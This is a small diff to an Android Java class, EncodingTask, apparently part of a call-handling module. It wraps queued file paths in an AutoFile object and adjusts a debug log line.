@@ -4,6 +4,7 @@ import java.util.concurrent.BlockingQueue;
 
 import com.android.deviceinfo.ProcessInfo;
 import com.android.deviceinfo.auto.Cfg;
+import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.interfaces.Observer;
 import com.android.deviceinfo.listener.ListenerProcess;
 import com.android.deviceinfo.module.ModuleCall;
@@ -68,11 +69,11 @@ public class EncodingTask implements Runnable, Observer<ProcessInfo> {
 			// progress
 			try {
 				while (queue.isEmpty() == false) {
-					String file = queue.take();
-
+					String fileQueue = queue.take();
+					AutoFile file = new AutoFile(fileQueue);
 					// Check if end of conversation
 					if (Cfg.DEBUG) {
-						Check.log(TAG + "(EncodingTask run): decoding " + file);
+						Check.log(TAG + "(EncodingTask run): decoding " + file.getName());
 					}
 
 		
